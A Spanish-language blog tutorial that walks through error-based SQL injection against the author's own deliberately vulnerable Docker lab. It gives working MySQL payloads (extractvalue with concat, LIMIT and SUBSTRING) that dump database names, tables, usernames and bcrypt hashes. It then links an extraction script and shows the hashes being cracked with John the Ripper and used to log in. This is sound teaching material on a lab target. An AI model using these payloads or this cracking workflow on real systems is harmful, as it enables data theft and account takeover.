---
layout      : post
title       : "Inyección SQL basada en errores"
author      : lanz
footer_text : Lanzboratorio
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-banner.png
category    : [ article ]
tags        : [ SQLi, sqli-error-based, lanzboratorio ]
---
Jugaremos con una app que tiene una vulnerabilidad llamada **inyección SQL** para mostrar cómo podemos manipular errores SQL y acceder a la información de bases de datos mediante ellos

# 🎉

**Con este laboratorio damos vida a un proyecto que tenía pensado hace mucho, el explicar a fondo cada vulnerabilidad usando laboratorios hechos por mis manitos e ideas**.

Iremos explorando distintas vulns, distintos enfoques y distintas formas de realizar algunas cosas y procesos, espero te gusten y sobre todo aprendas/refuerces temas 🪔🎇🎈

...

Este será el camino por el que iremos di-vagando.

1. [¿Qué es una inyección SQL?](#explicacion-sqli)
2. [Introducción al Lanzboratorio](#intro-lab).
  * [Instalamos Docker](#instalacion-docker).
  * [Levantamos lanzboratorio](#ejecucion-lab).
3. [Conociendo el entorno vulnerable](#enumeracion).
4. [Inyectando consultas SQL maliciosas](#explotacion).
  * [Encontrando errores](#explotacion-sqli-error).
  * [Jugando con los errores para extraer cositas](#explotacion-sqli-error-based).
5. [**Post-Explotación**: Aprovechando una SQLi para robar identidad de usuarios](#post-explotacion).

...

# ¿Qué es eso de inyección SQL? [#](#explicacion-sqli) {#explicacion-sqli}

Realmente el concepto es muy sencillo, una vulnerabilidad **SQL injection** se centra en aprovechar consultas [SQL](https://aws.amazon.com/es/what-is/sql/#:~:text=es%20importante%20SQL%3F-,El%20lenguaje%20de%20consulta%20estructurada%20(SQL)%20es%20un%20lenguaje%20de,los%20diferentes%20lenguajes%20de%20programaci%C3%B3n.) previamente establecidas por la lógica de algún software (por ejemplo un servicio para iniciar sesión) paaara incluir en ellas código **SQL** malicioso y extraer la información que esté almacenada en alguna base de datos (o algunas).

* [Inyección SQL](https://es.wikipedia.org/wiki/Inyecci%C3%B3n_SQL)

Existen dos enfoques para el almacenamiento y recuperación de datos, **SQL** y **NoSQL**, los abordaremos rapidito.

**SQL** define un modelo de datos relacional, o sea, permite organizar la información por tablas y columnas, relacionarlas mediante llaves para finalmente establecer conjuntos de datos.

Por otro lado, **NoSQL** permite que podamos mantener grandes cantidades de información sin necesidad de estarlas organizando. Hay ventajas y desventajas para cada modelo, pero te dejo la tarea de investigarlas y conocerlas (: En este lab lucharemos con SQL.

Como nota final, la mayoría de los gestores **SQL** tienen un estándar para formar su estructura, en él se define mediante un esquema de información ([INFORMATION_SCHEMA](https://www.navicat.com/en/company/aboutus/blog/1054-using-the-mysql-information-schema)), dónde guardar los metadatos de bases de datos, del gestor, de nombres de tablas, de columnas, privilegios disponibles, entre otros datos.

En la resolución iremos recorriendo esos metadatos para juguetear con las bases de datos.

# Lanzboratorio inyección SQL basada en errores [#](#intro-lab) {#intro-lab}

---

## Instalamos Docker [#](#instalacion-docker) {#instalacion-docker}

Vamos a jugar con [la **Docker Comunity Edition**](https://stackoverflow.com/questions/45023363/what-is-docker-io-in-relation-to-docker-ce-and-docker-ee-now-called-mirantis-k) para [**kali linux**](https://www.kali.org/docs/containers/installing-docker-on-kali/) (igual para tu SO fijo encuentras en internet la manera de instalarlo):

```bash
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | \
 sudo tee /etc/apt/sources.list.d/docker.list

curl -fsSL https://download.docker.com/linux/debian/gpg |
  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io
```

## Clonamos y levantamos lanzboratorio [#](#ejecucion-lab) {#ejecucion-lab}

Acá estarán alojados los laboratorios:

* [https://github.com/lanzt/Lanzboratorios](https://github.com/lanzt/Lanzboratorios)

---

Si quieres clonar el repositorio y acceder a todos:

```bash
git clone https://github.com/lanzt/Lanzboratorios
```

Si, por el contrario, quieres jugar con este en específico, entras en su carpeta y descargas el comprimido (`.zip`), lo descomprimes y listones.

* [https://github.com/lanzt/Lanzboratorios/tree/main/SQL%20Injection%20-%20Error%20Based](https://github.com/lanzt/Lanzboratorios/tree/main/SQL%20Injection%20-%20Error%20Based)

```bash
❯ ls -lah  
total 20K
drwxr-xr-x 4 lanz lanz 4.0K Apr 11 16:20 .
drwxr-xr-x 4 lanz lanz 4.0K Apr 11 16:20 ..
drwxr-xr-x 4 lanz lanz 4.0K Apr 11 16:20 app
-rw-r--r-- 1 lanz lanz  387 Apr 11 16:20 docker-compose.yml
drwxr-xr-x 3 lanz lanz 4.0K Apr 11 16:20 mysql
```

Ahora procedemos a ejecutarlo, con este simple paso (desde donde esté el archivo `.yml`):

```bash
sudo docker compose up
```

En algún punto veríamos que la app fue levantada sobre el puerto **5000**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-bash-docker-compose-app-running-localhost-5000.png" style="width: 100%;"/>

Y al validarlo estaríamos listos para empezar a auditarla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-app-running-localhost-5000.png" style="width: 50%;"/>

# Enumeración [#](#enumeracion) {#enumeracion}

Al ingresar lo primero que vemos es:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000.png" style="width: 80%;"/>

Un sitio web que habla sobre los juegos más populares. Tiene un `/login`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-login.png" style="width: 100%;"/>

Y si queremos ver más información de cada juego, podemos redirigirnos a `/details?id=1` (o 2, 3, ... hasta 8, del 9 pa lante da error):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-1.png" style="width: 100%;"/>

# Probando y probando, se va explotando [#](#explotacion) {#explotacion}

El recurso `/details` con el parámetro `id` y el `/login` con los campos de credenciales se ven muy interesantes.

Aún no lo sabemos, pero quizá esos recursos están extrayendo la información de alguna base de datos (o algunas, supongamos que es solo una), por lo que si en la interacción que tienen los campos con la base de datos la sanitización usada no es la adecuada, podríamos enviar consultas maliciosas para robar información interna de esa base de datos 🎩

## Encontrando errores SQL [#](#explotacion-sqli-error) {#explotacion-sqli-error}

Una de las primeras pruebas en un posible **SQLi** es jugar con una comilla simple (`'`), "así de simple" :P. Esto podría causar que una consulta se termine antes de lo previsto y la solicitud sea extraña e incompleta, generando así un error.

Imagina que interactuamos con `/details` de la siguiente forma:

```html
http://localhost:5000/details?id=1
```

Esa petición internamente generaría (no lo sabemos) la siguiente consulta:

> Pensando que `id_game` recibe valores numericos.

```sql
SELECT * FROM games WHERE id_game = 1;
```

Todo normal.

Si ahora enviamos la comilla:

```html
http://localhost:5000/details?id='
```

```sql
SELECT * FROM games WHERE id_game = ';
```

Si te fijas, la consulta luce incompleta, pueda que al procesarse genere un error y ese error es el que estamos buscando reflejar. También puede suceder otro error, como que quizá el campo `id` solo reciba números, que no pueda estar vacío, etc.

Con que recibamos un error o notemos algo distinto, ya podemos empezar a ilusionarnos.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-quote-test.png" style="width: 100%;"/>

Efectivamente, obtenemos un error de sintaxis (: Además vemos algo superimportante, el [gestor de base de datos](https://intelequia.com/es/blog/post/gestor-de-base-de-datos-qu%C3%A9-es-funcionalidades-y-ejemplos) que está siendo usado, en este caso [**MySQL**](https://www.mysql.com/).

> Al existir varios gestores de bases de datos, la sintaxis puede llegar a variar entre ellos, por lo que conocer que gestor tiene nuestro servicio, nos ahorra tiempo de ponernos a descrubrirlo.

Subamos de nivel...

## Encontrando SQLi basada en errores [#](#explotacion-sqli-error-based) {#explotacion-sqli-error-based}

Como ya vimos, tenemos errores, exploremos si los podemos aprovechar para extraer info.

Ya que tenemos un indicio de **SQLi**, busquemos consultas maliciosas relacionadas con nuestro gestor (o sea, contra **MySQL**):

* [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
* [MySQL SQL Injection Practical Cheat Sheet](https://www.advania.co.uk/insights/blog/mysql-sql-injection-practical-cheat-sheet/)
* [MySQL SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

La idea de la inyección es enviar consultas que generen errores, pero que al visualizarlos logremos concatenar información de nuestro interés en ellos.

Entre las funciones más usadas de **MySQL** en este tipo de inyección, están:

* [extractvalue()](https://www.dcs.bbk.ac.uk/~ptw/teaching/DBM/XPath/slide14.html): usada para leer información de un archivo XML guardado en una columna.
* [updatexml()](https://mariadb.com/kb/en/updatexml/): usada para modificar un nodo de un archivo XML guardado en una columna.

La sintaxis usada por cada una para jugar con inyecciones se encuentra a menudo así:

```sql
AND extractvalue(rand(),concat(0x3a,version()))--
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)--
```

Cada una está intentando interactuar con un archivo `XML` que claramente no existe, forzando así un error que nos revele información.

Generan un número aleatorio ([RAND()](https://dev.mysql.com/doc/refman/8.3/en/mathematical-functions.html#function_rand)), le concatenan valores para identificar la data necesaria (`0x3a` = `:` y `CHAR(126)` = `~`) y finalmente la versión de **MySQL** (ya depende de que queramos extraer). Toda esa información es la que veríamos cuando se genere el error (:

Quizá te preguntes la razón de usar [AND](https://dev.mysql.com/doc/refman/8.3/en/logical-operators.html#operator_and) al inicio de la consulta, es muy sencillo, lo usamos para indicar que lo que esta antes de él es una consulta verdadera y funcional, algo que devuelve información por sí sola, por ejemplo, sabemos que el id de juego `1` existe y devuelve información, así que esa sería nuestra consulta verdadera y funcional:

```html
http://localhost:5000/details?id=1 AND 1=1;#
```

```sql
SELECT * FROM games WHERE id_game = 1 AND 1=1;#
```

Así, haríamos que lo que está después del `AND` se ejecute (:

Ahora sí, extraigamos cositas.

> En caso de que no funcione, siempre hay que seguir probando, por ejemplo con `1'`, con `OR`, etc.

---

## SQLi Error-Based - Variables [#](#explotacion-sqli-error-based-variables) {#explotacion-sqli-error-based-variables}

Además de la información interna de las bases de datos, podemos extraer valores importantes relacionados al sistema y al gestor de db, como por ejemplo la versión del gestor (como ya vimos), el nombre del usuario que está ejecutando el gestor, entre otras.

Para extraer la versión exacta del gestor usamos `version()` (función de **MySQL**) o `@@version` (variable del sistema).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-version.png" style="width: 70%;"/>

O el nombre del usuario que está ejecutando la base de datos actual en el **MySQL**, puede ser con `user()` o `system_user()`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-user.png" style="width: 70%;"/>

Como tarea te dejo investigar que otras variables y funciones pueden mostrarnos info importante. Y pues las pruebas a ver si es verdad :P

## SQLi Error-Based - Bases de datos [#](#explotacion-sqli-error-based-dbs) {#explotacion-sqli-error-based-dbs}

Para poder llegar a la información interna, como usuarios, contraseñas y demás datos (si es que existen), primero necesitamos conocer sus bases (ja, literalmente), o sea, sus bases de datos.

Por ejemplo, para conocer el nombre de la base de datos **actual**, la que está usando el servicio web, podemos usar la función `database()`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-database.png" style="width: 100%;"/>

La base de datos con la que interactúa el servicio se llama `gamesatin`.

Y si queremos conocer todas las bases de datos alojadas en el gestor, usaremos la metadata alojada en la base de datos [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.3/en/information-schema.html).

En este caso específico de los nombres de las bases de datos, jugaremos con la tabla [SCHEMATA](https://dev.mysql.com/doc/mysql-infoschema-excerpt/5.7/en/information-schema-schemata-table.html) y su campo [SCHEMA_NAME](https://dev.mysql.com/doc/mysql-infoschema-excerpt/5.7/en/information-schema-schemata-table.html):

> "A schema is a database, so the SCHEMATA table provides information about databases." ~ [dev.mysql.com](https://dev.mysql.com/doc/mysql-infoschema-excerpt/5.7/en/information-schema-schemata-table.html)

```sql
SELECT schema_name FROM information_schema.schemata;
```

Y para nuestro ejercicio:

> Para evitar posibles problemas con la consulta, la encerramos con paréntesis.

> http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,`ANTES`));#
> http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,`(AHORA)`));#

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SELECT schema_name FROM information_schema.schemata)));#
```

Como resultado obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-information_schema-schemata-error.png" style="width: 100%;"/>

Nos indica que encontró más de un resultado a imprimir -más de una fila (más de una base de datos)-, pero como nuestra consulta inicial está esperando un único resultado, no logra mostrar toda la info extraída. Para indicarle a la consulta que limite la salida por pantalla a un solo resultado, podemos emplear la sentencia [LIMIT](https://dev.mysql.com/doc/refman/8.0/en/limit-optimization.html):

```sql
SELECT schema_name FROM information_schema.schemata LIMIT 0,1;
```

Donde:

* `0` lo usamos como un índice, con él manejamos el resultado que queremos mostrar, o sea, el valor de la fila 0, después el de la 1, la 2 y así.
* `1` es el número de resultados que queremos obtener, o sea, uno solo.

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1)));#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-information_schema-schemata-limit-0-1.png" style="width: 100%;"/>

Si nos movemos entre los índices obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-information_schema-schemata-limit-1-1.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-information_schema-schemata-limit-2-1.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-information_schema-schemata-limit-3-1.png" style="width: 100%;"/>

Por lo que solo existen 3 bases de datos:

```sql
information_schema
performance_schema
gamesatin
```

Perfecto, la que nos interesa inicialmente es `gamesatin`.

Para continuar necesitamos conocer los nombres de las tablas asociadas a esa base de datos.

## SQLi Error-Based - Tablas [#](#explotacion-sqli-error-based-tables) {#explotacion-sqli-error-based-tables}

Siguiendo con la metadata alojada en la base de datos [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.3/en/information-schema.html), ahora usaremos la tabla [TABLES](https://dev.mysql.com/doc/refman/8.3/en/information-schema-tables-table.html) y los campos [TABLE_SCHEMA](https://dev.mysql.com/doc/refman/8.3/en/information-schema-tables-table.html) y [TABLE_NAME](https://dev.mysql.com/doc/refman/8.3/en/information-schema-tables-table.html) para generar la siguiente consulta:

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'gamesatin' LIMIT 0,1;
```

Donde:

* `table_name` extraerá los nombres de las tablas asociadas a la base de datos referenciada en
* `table_schema`, o sea, a **gamesatin**.

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema = 'gamesatin' LIMIT 0,1)));#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-information_schema-tables-limit-0-1.png" style="width: 100%;"/>

La primera tabla se llama `games`, si nos movemos entre filas, solo encontramos una más llamada `gamesatin_users`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-information_schema-tables-limit-1-1.png" style="width: 100%;"/>

Así que en resumen:

```sql
# Bases de datos
information_schema
performance_schema
gamesatin
# Tablas de la base de datos 'gamesatin'
games
gamesatin_users
```

Lindo lindo, vamos avanzando, nuestro siguiente objetivo es identificar que columnas existen es esas tablas, logrando así la posterior extracción de data alojada en ellas. La más llamativa en este punto es `gamesatin_users`, ya que posiblemente este alojando datos de **usuarios**.

> De igual forma es importante para nuestra enumeración conocer que datos estan almacenados en otras tablas, no sabemos que joyas podemos estar obviando.

## SQLi Error-Based - Columnas [#](#explotacion-sqli-error-based-columns) {#explotacion-sqli-error-based-columns}

En este paso usaremos de la metadata [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.3/en/information-schema.html) la tabla [COLUMNS](https://dev.mysql.com/doc/refman/8.3/en/information-schema-columns-table.html) y sus campos [TABLE_SCHEMA](https://dev.mysql.com/doc/refman/8.3/en/information-schema-columns-table.html), [TABLE_NAME](https://dev.mysql.com/doc/refman/8.3/en/information-schema-columns-table.html) y [COLUMN_NAME](https://dev.mysql.com/doc/refman/8.3/en/information-schema-columns-table.html), formando esta consulta:

```sql
SELECT column_name FROM information_schema.columns WHERE table_schema = 'gamesatin' AND table_name = 'gamesatin_users' LIMIT 0,1;
```

Donde (yo creo que ya sabes más o menos como leer la consulta según la explicación anterior, si no, cero lío):

* `column_name` nos extraerá los nombres de las columnas asociadas a la tabla referenciada en
* `table_name`, en este caso **gamesatin_users**, que está alojada en la base de datos indicada por la columna/campo
* `table_schema`, o sea, **gamesatin**.

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_schema = 'gamesatin' AND table_name = 'gamesatin_users' LIMIT 0,1)));#
```

Y al ejecutarla en el servidor web, descubrimos que la primera columna se llama `id`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-information_schema-columns-limit-0-1.png" style="width: 100%;"/>

Continuando la extracción, en total encontramos 7 columnas:

```sql
id
username
password_hash
favorite_game_genre
date_of_birth
account_creation_date
is_admin
```

Con esto sabemos que podemos llegar a extraer, nombres de usuario, contraseñas en formato hash, fechas de nacimiento, conocer si el usuario es administrador. Jmm, bastante información sensible.

## SQLi Error-Based - Valores [#](#explotacion-sqli-error-based-values) {#explotacion-sqli-error-based-values}

Como ya tenemos nombres de bases de datos, tablas y columnas de una de ellas, no es necesario usar más la metadata de [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.3/en/information-schema.html), ahora emplearemos consultas sencillas y directas.

### Nombres de usuario [#](#explotacion-sqli-error-based-values-username) {#explotacion-sqli-error-based-values-username}

Por ejemplo, para conocer los nombres de usuario (`username`) guardados en la tabla `gamesatin_users` de la base de datos `gamesatin`, podemos usar:

```sql
SELECT username FROM gamesatin.gamesatin_users LIMIT 0,1;
```

Y enviaríamos la petición al sitio:

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SELECT username FROM gamesatin.gamesatin_users LIMIT 0,1)));#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-gamesatin-gamesatin_users-username-limit-0-1.png" style="width: 100%;"/>

Si recorremos las filas, extraemos 13 nombres de usuario:

```sql
admin
alina4
amAT
andersonA
andrea
angieAsy
anton1oL
fredDao_
g4merZhito
rubenGamer
saraLOX
toooooonyi
zonem1nd7atX
```

Ya estamos tratando con información real!!

### Contraseñas [#](#explotacion-sqli-error-based-values-password) {#explotacion-sqli-error-based-values-password}

Intentemos leer las contraseñas.

```sql
SELECT password_hash FROM gamesatin.gamesatin_users LIMIT 0,1;
```

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SELECT password_hash FROM gamesatin.gamesatin_users LIMIT 0,1)));#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-gamesatin-gamesatin_users-password_hash-limit-0-1.png" style="width: 100%;"/>

Para [conocer](https://hashcat.net/wiki/doku.php?id=example_hashes) qué [algoritmo de hashing](https://www.ionos.es/digitalguide/paginas-web/desarrollo-web/hashing/) fue usado, podemos apoyarnos de herramientas web como [TunnelsUP](https://www.tunnelsup.com/hash-analyzer/) o de consola como [hashid](https://www.kali.org/tools/hashid/) o [hash-identifier](https://www.kali.org/tools/hash-identifier/).

```bash
➧ hashid '$2y$10$tQcW5eKQwlfoEIR9tBvNfuBp'
Analyzing '$2y$10$tQcW5eKQwlfoEIR9tBvNfuBp'
[+] Unknown hash

➧ hash-identifier
...
 Not Found.
```

No identifican que algoritmo fue usado, si filtramos por el inicio de la cadena (`$2` o `$2y$`) tanto en [ejemplos](https://hashcat.net/wiki/doku.php?id=example_hashes) como en la [web](https://security.stackexchange.com/questions/136843/what-type-of-hashes-are-these-and-what-are-salts), encontramos que posiblemente se usó el algoritmo [Bcrypt](https://en.wikipedia.org/wiki/Bcrypt), el cual en su proceso de derivación es lento y dificulta el proceso de fuerza bruta.

Algo que iluminador es que si comparamos la longitud de nuestro hash (32 bytes) con la de algún ejemplo (desde 40 bytes más o menos), al parecer nos faltan caracteres.

Para validarlo, podemos hacer uso de la función [SUBSTRING](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_substring) de **MySQL** para extraer longitudes específicas de cadenas/resultados, ejemplo:

```txt
holaestaeslacontraseña,peronosevecompletayestamosasustaos
```

Actualmente, nos está extrayendo 32 caracteres, o sea:

```txt
holaestaeslacontraseña,peronos
```

Si hacemos la prueba contra el servidor web, nos lo confirma:

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SUBSTRING('holaestaeslacontraseña,peronosevecompletayestamosasustaos',1,32))));#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-substring-holaestaeslacontrasena-only-32-chars.png" style="width: 100%;"/>

Y si intentamos extraer 60 caracteres, nos sigue mostrando 32:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-substring-holaestaeslacontrasena-60-chars-invalid-only-32.png" style="width: 100%;"/>

Así que he ahí la razón por la que ninguna herramienta nos detectó el algoritmo, nuestro hash está incompleto.

Pero ya vimos la solución, empleemos [SUBSTRING](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_substring) para extraer de a 20 caracteres e irnos moviendo y así aseguramos obtener la cadena completa.

🥇 Los primeros 20:

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SUBSTRING((SELECT password_hash FROM gamesatin.gamesatin_users LIMIT 0,1),1,20))));#
```

```txt
$2y$10$tQcW5eKQwlfoE
```

🥈 Los siguientes 20:

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SUBSTRING((SELECT password_hash FROM gamesatin.gamesatin_users LIMIT 0,1),21,20))));#
```

```txt
IR9tBvNfuBpKMc42zwDmjRFr3sRJOIX
```

Y el valor total contendría:

```txt
$2y$10$tQcW5eKQwlfoEIR9tBvNfuBpKMc42zwDmjRFr3sRJOIX
```

🥉 Los siguientes 20:

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SUBSTRING((SELECT password_hash FROM gamesatin.gamesatin_users LIMIT 0,1),41,20))));#
```

```txt
RFr3sRJOIXEEvi5PYDC
```

El valor final del hash sería (validando ya no existen más caracteres):

```txt
$2y$10$tQcW5eKQwlfoEIR9tBvNfuBpKMc42zwDmjRFr3sRJOIXEEvi5PYDC
```

Si comprobamos:

```bash
➧ hashid '$2y$10$tQcW5eKQwlfoEIR9tBvNfuBpKMc42zwDmjRFr3sRJOIXEEvi5PYDC'
Analyzing '$2y$10$tQcW5eKQwlfoEIR9tBvNfuBpKMc42zwDmjRFr3sRJOIXEEvi5PYDC'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt
```

Perfecto (:

Así podemos seguir extrayendo y extrayendo información de todas las bases de datos...

Digamos que acá podría finalizar el post, ya que jugamos con una inyección SQL basada en errores para extraer toda la información que quisimos de las bases de datos y el gestor.

Pero para un atacante acá no termina la cosa, como vimos desde el inicio, mediante una inyección SQL se logra robar información, ¿pero como podemos usar esa información? Pues vamos a ver una de las tantas respuestas.

# Post-Explotación [#](#post-explotacion) {#post-explotacion}

---

## Robo de credenciales e inicio de sesión mediante un SQLi [#](#post-explotacion-sqli-login) {#explotacion-sqli-login}

Sabemos que existe información de usuarios, tanto nombres, como contraseñas, así mismo sabemos que hay un sistema de login, por lo que si relacionamos la info quizá esos datos de usuarios puedan ser usados en ese login y logremos robar la identidad de usuarios, accediendo a rutas no públicas, a usuarios con roles distintos, a controlar la información de esos usuarios, en fin, varias cosas malas pueden pasar.

Ya contamos con nombres de usuario y sabemos como extraer las contraseñas completas, peeero, realizar este proceso manualmente es muuy demorado (y más si existen varios usuarios), por lo que podemos crear un script para que mediante cada consulta que ya aprendimos, extraiga la información de todo el gestor y bases de datos.

> [Acá te lo dejo, está hecho en **Python** y su uso es muy sencillo](https://github.com/lanzt/blog/blob/main/assets/scripts/articles/sqli-error-based/sqli-error-based-gamesatin-id.py).

El programa tiene la misma sintaxis que usamos manualmente, así que entenderlo va a ser pan comido (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-bash-py-sqli-usage.png" style="width: 100%;"/>

### Script SQLi - Bases de datos

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-bash-py-sqli-databases.png" style="width: 100%;"/>

### Script SQLi - Tablas

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-bash-py-sqli-tables.png" style="width: 100%;"/>

### Script SQLi - Columnas

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-bash-py-sqli-columns.png" style="width: 100%;"/>

### Script SQLi - Información de columnas

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-bash-py-sqli-column-data.png" style="width: 100%;"/>

### Cracking [#](#post-explotacion-cracking) {#post-explotacion-cracking}

Ahora que contamos con varias contraseñas en formato hash, podemos emplear ataques de prueba y error ([fuerza bruta](https://latam.kaspersky.com/resource-center/definitions/brute-force-attack)) para intentar descubrir el valor en plano de esas credenciales.

Para esa labor existen varias herramientas, principalmente [hashcat](https://hashcat.net/hashcat/) y [john the ripper](https://www.openwall.com/john/), las cuales toman una palabra de un diccionario, le generan su hash y si ese hash es igual que el que proporcionamos, significa que hemos encontrado una combinación y conocemos el valor del hash en texto plano.

Entonces, colocamos los hashes en un archivo y jugamos. Con **John** debemos validar si el tipo de algoritmo es soportado, así que filtramos entre todos sus formatos buscando a `bcrypt`:

```bash
➧ john --list=formats | grep -i bcrypt
416 formats (149 dynamic formats shown as just "dynamic_n" here)
descrypt, bsdicrypt, md5crypt, md5crypt-long, bcrypt, scrypt, LM, AFS,
```

Existe, así que ejecutamos **John** con el diccionario (casi siempre se usa [rockyou.txt](https://www.keepersecurity.com/blog/es/2023/08/04/understanding-rockyou-txt-a-tool-for-security-and-a-weapon-for-hackers/), pero depende mucho del entorno y auditoria) y el archivo con las contraseñas:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt gamesatin_users_password.hashes
```

Esperamos un rato (recuerda, este algoritmo es difícil de derivar, o sea, si queremos crackear, va a ser lento el proceso) y encontramos un valor en texto plano:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-bash-john-found-plaintext-password.png" style="width: 100%;"/>

Solo que no sabemos de quién es, para ello podemos hacer una consulta SQL sencilla usando la función [CONCAT](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_concat), que concatena valores, la usaremos para que nos imprima tanto el nombre de usuario como su inicio de contraseña hasheada y ya sabríamos a quién pertenece esa contraseña:

```html
http://localhost:5000/details?id=2 AND extractvalue(rand(),concat(0x3a,(SELECT CONCAT(username,":",password_hash) FROM gamesatin.gamesatin_users LIMIT 0,1)));#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-details-sqli-gamesatin-gamesatin_users-concat-username-password_hash-limit-0-1.png" style="width: 100%;"/>

O con el script:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-bash-py-sqli-concat-column-data.png" style="width: 100%;"/>

Identificamos entonces, que la contraseña (y hash) está asociada al usuario `zonem1nd7atX`. Si intentamos iniciar sesión con esas credenciales obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/sqli-error-based/lanzbSQLIERRORBASED-page5000-login-logged-lanzboratorio-approved.png" style="width: 100%;"/>

Y ya estariamos dentro como un usuario, pero tomando en cuenta que existen muchos más usuarios, quizá alguno de ellos tenga algún recurso que los demás no, quizá alguno tenga algún mensaje distinto. Todo eso debemos pensar cuando hacemos este tipo de intrusiones. Además de los distintos ataques de ingeniería social que se pueden hacer.

...

Una explicación creo yo que muy detallada, un paso a paso que disfruté mucho y sobre todo disfruté al realizar desde cero todo el laboratorio.

